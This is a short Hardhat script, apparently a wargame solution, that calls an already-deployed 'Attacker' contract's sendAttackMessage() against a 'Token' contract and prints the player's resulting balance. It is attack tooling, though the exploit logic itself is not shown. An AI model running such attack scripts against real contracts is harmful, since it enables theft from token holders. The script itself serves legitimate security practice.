import { ethers } from "hardhat";
const CONTRACT_ADDRESS = "0xa855A0060156c3D3567423b4D9aCFfA4b7Ab8F3d";
const PLAYER_ADDRESS = "0x81215d34367AF48d01E728AfF2976d9Df32fE604";
const ATTACKER_CONTRACT = "0x69e3b78Ba361367FFbF06C1a9dAE1C3c0a86B2a8";

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  const contract = await ethers.getContractAt(
    "Token",
    CONTRACT_ADDRESS,
    signer
  );

  const attackerContract = await ethers.getContractAt(
    "Attacker",
    ATTACKER_CONTRACT,
    signer
  );

  console.log(
    `sending an attack message ${await attackerContract.sendAttackMessage()}`
  );

  console.log(
    `The new balance of the player address is: ${await contract.balanceOf(
      PLAYER_ADDRESS
    )}`
  );
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
